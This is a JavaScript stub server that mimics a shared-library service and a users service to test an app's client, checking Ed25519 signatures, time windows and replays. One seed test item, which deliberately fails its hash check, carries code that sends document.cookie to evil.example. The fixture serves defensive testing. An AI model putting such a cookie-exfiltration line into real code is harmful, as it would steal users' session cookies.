// A stand-in for shared.aiui.oeaio.com and users.aiui.oeaio.com (docs/shared-and-users.md) to
// test the app's client before the real services exist. One port serves both (their paths don't
// collide). Every signed request is checked independently of the app's code: node:crypto Ed25519
// over the exact contract message, the 5-minute window and replays.
//   node tools/shared-client/stub.mjs [port]       (default 8790)
// Test helpers (not part of the contract): POST /test/other {action, ...} — a second user acting
// with its own key; POST /test/bump {id} — a new version of an item; GET /test/log — what happened.
import http from 'node:http';
import crypto from 'node:crypto';

const port = Number(process.argv[2] || process.env.PORT || 8790);
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
const now = () => new Date().toISOString();
let ulidN = 0;
const ulid = () => (Date.now().toString(36).toUpperCase() + (ulidN++).toString(36).toUpperCase()).padEnd(26, '0').slice(0, 26);
const log = [];
const note = (x) => { log.push({ at: now(), ...x }); if (process.env.STUB_VERBOSE) console.log(JSON.stringify(x)); };

// ---------------------------------------------------------------- signatures (independent check)

const SPKI_PREFIX = Buffer.from('302a300506032b6570032100', 'hex');
const pubKey = (hex) => crypto.createPublicKey({ key: Buffer.concat([SPKI_PREFIX, Buffer.from(hex, 'hex')]), format: 'der', type: 'spki' });
const b64u = (b) => Buffer.from(b).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const fromB64u = (s) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
const seen = new Map(); // id|time|sig -> at

function verify(req, path, body) {
  const id = req.headers['x-aiui-id'], time = req.headers['x-aiui-time'], sig = req.headers['x-aiui-signature'];
  if (!id || !time || !sig) return [401, 'missing signature'];
  if (!/^[0-9a-f]{64}$/.test(id)) return [401, 'bad id'];
  if (!/^\d+$/.test(time) || Math.abs(Date.now() - Number(time)) > 5 * 60 * 1000) return [401, 'time out of window'];
  if (/[+/=]/.test(sig)) return [401, 'signature must be base64url without padding'];
  const message = `aiui/v1\n${req.method}\n${path}\n${time}\n${sha(body)}`;
  let ok = false;
  try { ok = crypto.verify(null, Buffer.from(message, 'utf8'), pubKey(id), fromB64u(sig)); } catch { ok = false; }
  if (!ok) { note({ kind: 'badSignature', id, path, message }); return [401, 'bad signature']; }
  const key = `${id}|${time}|${sig}`;
  for (const [k, at] of seen) if (Date.now() - at > 10 * 60 * 1000) seen.delete(k);
  if (seen.has(key)) return [409, 'replay'];
  seen.set(key, Date.now());
  note({ kind: 'verified', id, method: req.method, path, bodySha: sha(body) });
  return [0, id];
}

// A second user for the tests, signing its own requests the same way.
const other = crypto.generateKeyPairSync('ed25519');
const otherId = other.publicKey.export({ format: 'der', type: 'spki' }).subarray(12).toString('hex');
async function asOther(method, path, json) {
  const body = json ? Buffer.from(JSON.stringify(json)) : Buffer.alloc(0);
  const time = String(Date.now());
  const msg = `aiui/v1\n${method}\n${path}\n${time}\n${sha(body)}`;
  const sig = b64u(crypto.sign(null, Buffer.from(msg), other.privateKey));
  const r = await fetch(`http://127.0.0.1:${port}${path}`, { method, body: json ? body : undefined,
    headers: { 'Content-Type': 'application/json', 'X-AIUI-Id': otherId, 'X-AIUI-Time': time, 'X-AIUI-Signature': sig } });
  return { status: r.status, body: await r.json().catch(() => ({})) };
}

// ---------------------------------------------------------------- data

const items = new Map();     // id -> meta
const payloads = new Map();  // sha -> Buffer
const removed = [];          // {id, at}
const adoptedBy = new Map(); // id -> Set(appId)
const reportsBy = new Map(); // id -> Set(appId)

function addItem(fields, payloadObj, opts = {}) {
  const bytes = Buffer.from(JSON.stringify(payloadObj));
  const existing = [...items.values()].find((x) => x.author === fields.author && x.kind === fields.kind && x.name === fields.name &&
    JSON.stringify(x.path) === JSON.stringify(fields.path));
  const t = now();
  const it = existing || { id: ulid(), created: t, adoptions: 0, reports: 0, version: 0 };
  Object.assign(it, fields, { version: it.version + 1, sha256: opts.badSha || sha(bytes), size: bytes.length, updated: t });
  payloads.set(it.sha256, bytes);
  items.set(it.id, it);
  return it;
}

const SEED_AUTHOR = 'ab'.repeat(32);
addItem({ kind: 'util', name: 'formatBytes', path: ['format', 'numbers'], title: 'Format bytes', description: 'Turns a byte count into KB/MB/GB text.',
  usage: 'lib.formatBytes(n) → "1.2 MB"', author: SEED_AUTHOR, authorName: 'Seed', libs: [], uses: [] },
{ code: 'lib.formatBytes = (n) => n >= 1e9 ? (n/1e9).toFixed(1)+" GB" : n >= 1e6 ? (n/1e6).toFixed(1)+" MB" : Math.round(n/1e3)+" KB";', css: '' });
addItem({ kind: 'component', name: 'starRating', path: ['ui', 'input'], title: 'Star rating', description: 'A 1–5 star rating control with keyboard support.',
  usage: 'lib.starRating(el, {value, onChange})', author: SEED_AUTHOR, libs: [], uses: [] },
{ code: 'lib.starRating = (el, o) => { el.textContent = "★".repeat(o.value||0); };', css: '.sr-star{color:gold}' });
addItem({ kind: 'util', name: 'tampered', path: ['test'], title: 'Tampered download', description: 'Its payload does not match its sha256.',
  usage: 'lib.tampered()', author: SEED_AUTHOR, libs: [], uses: [] },
{ code: 'lib.tampered = () => fetch("https://evil.example/" + document.cookie);', css: '' }, { badSha: 'f'.repeat(64) });
// The tampered item's metadata claims a hash, but the stored bytes are something else.
payloads.set('f'.repeat(64), Buffer.from(JSON.stringify({ code: 'lib.tampered = () => fetch("https://evil.example/" + document.cookie);', css: '' })));
addItem({ kind: 'applet', name: 'pomodoro', path: ['applets'], title: 'Pomodoro timer', description: 'A 25/5 focus timer.',
  usage: 'Open it as an applet.', author: SEED_AUTHOR, libs: [], uses: [] },
{ kind: 'html', title: 'Pomodoro timer', html: '<h1>Pomodoro</h1><div id="t">25:00</div><script>aiui.ready()</script>', uses: [], libs: [] });

const profiles = new Map(); // id -> profile
const contacts = new Map(); // owner -> Map(other -> {note, at})
const inbox = new Map();    // id -> [events]
const pushEvent = (id, e) => { if (!inbox.has(id)) inbox.set(id, []); inbox.get(id).push({ ...e, at: now() }); };
profiles.set(otherId, { id: otherId, name: 'Olga Tester', handle: 'olga', about: 'the other user in tests', findable: true, updated: now() });
profiles.set('cd'.repeat(32), { id: 'cd'.repeat(32), name: 'Hidden Hans', handle: 'hans', about: '', findable: false, updated: now() });

const has = (a, b) => contacts.get(a)?.has(b);
function contactList(me) {
  const out = [];
  for (const [other, c] of contacts.get(me) || []) {
    const mutual = has(other, me);
    const p = profiles.get(other);
    out.push({ id: other, state: mutual ? 'mutual' : 'pending', since: c.at, ...(mutual || p?.findable ? { name: p?.name } : {}) });
  }
  for (const [owner, m] of contacts) if (owner !== me && m.has(me) && !has(me, owner)) {
    out.push({ id: owner, state: 'incoming', note: m.get(me).note || '', since: m.get(me).at });
  }
  return out;
}

// ---------------------------------------------------------------- routes

const json = (res, status, obj, extra = {}) => {
  res.writeHead(status, { 'Content-Type': 'application/json', ...extra });
  res.end(JSON.stringify(obj));
};
const err = (res, status, msg) => json(res, status, { error: msg });
const live = () => [...items.values()].filter((x) => (reportsBy.get(x.id)?.size || 0) < 3).sort((a, b) => b.updated.localeCompare(a.updated));
const PAGE = Number(process.env.STUB_PAGE || 2); // small pages, to exercise `next`

const server = http.createServer(async (req, res) => {
  const chunks = [];
  for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks);
  const url = new URL(req.url, 'http://x');
  const path = url.pathname;
  let body = {};
  if (raw.length) { try { body = JSON.parse(raw.toString('utf8')); } catch { return err(res, 400, 'bad json'); } }
  const signed = () => { const [code, v] = verify(req, path, raw); if (code) { err(res, code, v); return null; } return v; };
  note({ kind: 'request', method: req.method, path, query: url.search });
  let m;
  try {
    // --- shared
    if (req.method === 'GET' && path === '/v1/index') {
      const since = url.searchParams.get('since');
      const all = live().filter((x) => !since || x.updated > since);
      const start = Number(url.searchParams.get('next') || 0);
      const page = all.slice(start, start + PAGE);
      const out = { items: page, generated: now() };
      if (start + PAGE < all.length) out.next = String(start + PAGE);
      if (since) out.removed = removed.filter((r) => r.at > since).map((r) => r.id);
      return json(res, 200, out);
    }
    if (req.method === 'GET' && path === '/v1/search') {
      const q = (url.searchParams.get('q') || '').toLowerCase(), kind = url.searchParams.get('kind');
      const hits = live().filter((x) => (!kind || x.kind === kind) && [x.name, x.title, x.description, x.path.join(' ')].join(' ').toLowerCase().includes(q));
      return json(res, 200, { items: hits.slice(0, 50) });
    }
    if ((m = path.match(/^\/v1\/items\/([^/]+)$/)) && req.method === 'GET') {
      const it = items.get(m[1]); return it ? json(res, 200, it) : err(res, 404, 'not found');
    }
    if ((m = path.match(/^\/v1\/items\/([^/]+)\/payload$/)) && req.method === 'GET') {
      const it = items.get(m[1]); if (!it) return err(res, 404, 'not found');
      res.writeHead(200, { 'Content-Type': 'application/json' }); return res.end(payloads.get(it.sha256));
    }
    if (req.method === 'POST' && path === '/v1/items') {
      const me = signed(); if (!me) return;
      const { kind, name, path: p, title, description = '', usage = '', libs = [], uses = [], payload } = body;
      if (!['component', 'util', 'applet'].includes(kind) || !name || !Array.isArray(p) || typeof payload !== 'object') return err(res, 400, 'bad input');
      if (JSON.stringify(payload).length > 512 * 1024) return err(res, 413, 'too large');
      const it = addItem({ kind, name, path: p, title: title || name, description, usage, libs, uses, author: me, authorName: profiles.get(me)?.name }, payload);
      note({ kind: 'shared', id: it.id, author: me, body });
      return json(res, 200, it);
    }
    if ((m = path.match(/^\/v1\/items\/([^/]+)$/)) && req.method === 'DELETE') {
      const me = signed(); if (!me) return;
      const it = items.get(m[1]); if (!it) return err(res, 404, 'not found');
      if (it.author !== me) return err(res, 403, 'not yours');
      items.delete(it.id); removed.push({ id: it.id, at: now() });
      return json(res, 200, { ok: true });
    }
    if ((m = path.match(/^\/v1\/items\/([^/]+)\/adopted$/)) && req.method === 'POST') {
      const me = signed(); if (!me) return;
      const it = items.get(m[1]); if (!it) return err(res, 404, 'not found');
      if (!adoptedBy.has(it.id)) adoptedBy.set(it.id, new Set());
      adoptedBy.get(it.id).add(me); it.adoptions = adoptedBy.get(it.id).size;
      return json(res, 200, { ok: true, adoptions: it.adoptions });
    }
    if ((m = path.match(/^\/v1\/items\/([^/]+)\/report$/)) && req.method === 'POST') {
      const me = signed(); if (!me) return;
      const it = items.get(m[1]); if (!it) return err(res, 404, 'not found');
      if (!body.reason) return err(res, 400, 'reason required');
      if (!reportsBy.has(it.id)) reportsBy.set(it.id, new Set());
      reportsBy.get(it.id).add(me); it.reports = reportsBy.get(it.id).size;
      note({ kind: 'report', id: it.id, by: me, reason: body.reason });
      return json(res, 200, { ok: true });
    }
    // --- users
    if (req.method === 'PUT' && path === '/v1/profile') {
      const me = signed(); if (!me) return;
      const { name, handle, about = '', findable = false } = body;
      if (!name || name.length > 60) return err(res, 400, 'name: 1-60 characters');
      if (handle && !/^[a-z0-9_-]{3,30}$/.test(handle)) return err(res, 400, 'bad handle');
      if (handle && [...profiles.values()].some((p) => p.handle === handle && p.id !== me)) return err(res, 409, 'handle taken');
      if (about.length > 280) return err(res, 400, 'about too long');
      const p = { id: me, name, ...(handle ? { handle } : {}), about, findable: !!findable, updated: now() };
      profiles.set(me, p);
      return json(res, 200, p);
    }
    if (req.method === 'DELETE' && path === '/v1/profile') {
      const me = signed(); if (!me) return;
      profiles.delete(me); contacts.delete(me);
      return json(res, 200, { ok: true });
    }
    if ((m = path.match(/^\/v1\/profiles\/([0-9a-f]{64})$/)) && req.method === 'GET') {
      const p = profiles.get(m[1]); return p && p.findable ? json(res, 200, p) : err(res, 404, 'not found');
    }
    if (req.method === 'GET' && path === '/v1/find') {
      const q = (url.searchParams.get('q') || '').toLowerCase().replace(/^@/, '');
      const all = [...profiles.values()].filter((p) => p.findable);
      const exact = all.filter((p) => p.handle === q);
      const rest = all.filter((p) => p.handle !== q && (p.name.toLowerCase().includes(q) || (p.handle || '').includes(q)));
      return json(res, 200, { profiles: [...exact, ...rest].slice(0, 20) });
    }
    if (req.method === 'POST' && path === '/v1/contacts') {
      const me = signed(); if (!me) return;
      if (!/^[0-9a-f]{64}$/.test(body.id || '') || body.id === me) return err(res, 400, 'bad id');
      if (!contacts.has(me)) contacts.set(me, new Map());
      const fresh = !has(me, body.id);
      contacts.get(me).set(body.id, { note: body.note || '', at: now() });
      if (fresh) {
        if (has(body.id, me)) { pushEvent(me, { type: 'mutual', id: body.id }); pushEvent(body.id, { type: 'mutual', id: me }); }
        else pushEvent(body.id, { type: 'incoming', id: me, note: body.note || '' });
      }
      return json(res, 200, { ok: true });
    }
    if ((m = path.match(/^\/v1\/contacts\/([0-9a-f]{64})$/)) && req.method === 'DELETE') {
      const me = signed(); if (!me) return;
      contacts.get(me)?.delete(m[1]); pushEvent(m[1], { type: 'removed', id: me });
      return json(res, 200, { ok: true });
    }
    if (req.method === 'GET' && path === '/v1/contacts') {
      const me = signed(); if (!me) return;
      return json(res, 200, { contacts: contactList(me) });
    }
    if (req.method === 'GET' && path === '/v1/router/inbox') {
      const me = signed(); if (!me) return;
      const events = inbox.get(me) || []; inbox.set(me, []);
      return json(res, 200, { events });
    }
    // --- test helpers
    if (req.method === 'POST' && path === '/test/other') {
      let r;
      if (body.action === 'add') r = await asOther('POST', '/v1/contacts', { id: body.id, note: body.note || 'hi from Olga' });
      else if (body.action === 'remove') r = await asOther('DELETE', '/v1/contacts/' + body.id);
      else if (body.action === 'share') r = await asOther('POST', '/v1/items', body.item);
      else if (body.action === 'replay') {
        // The same signed request twice: the second must be refused (409).
        const b = Buffer.from(JSON.stringify({ id: body.id })); const time = String(Date.now());
        const sig = b64u(crypto.sign(null, Buffer.from(`aiui/v1\nPOST\n/v1/contacts\n${time}\n${sha(b)}`), other.privateKey));
        const send = () => fetch(`http://127.0.0.1:${port}/v1/contacts`, { method: 'POST', body: b, headers: { 'X-AIUI-Id': otherId, 'X-AIUI-Time': time, 'X-AIUI-Signature': sig } }).then((x) => x.status);
        r = { status: [await send(), await send()] };
      }
      return json(res, 200, { otherId, ...r });
    }
    if (req.method === 'POST' && path === '/test/bump') {
      const it = items.get(body.id); if (!it) return err(res, 404, 'not found');
      const old = JSON.parse(payloads.get(it.sha256));
      old.code = (old.code || '') + '\n// v' + (it.version + 1);
      const { id, created, adoptions, reports, version, sha256, size, updated, ...fields } = it;
      return json(res, 200, addItem(fields, old));
    }
    if (req.method === 'GET' && path === '/test/log') return json(res, 200, { log, otherId, items: [...items.values()] });
    return err(res, 404, 'unknown route');
  } catch (e) {
    return err(res, 500, String(e && e.message || e));
  }
});
server.listen(port, '127.0.0.1', () => console.log(`stub on http://127.0.0.1:${port} (other user ${otherId.slice(0, 6)}…)`));
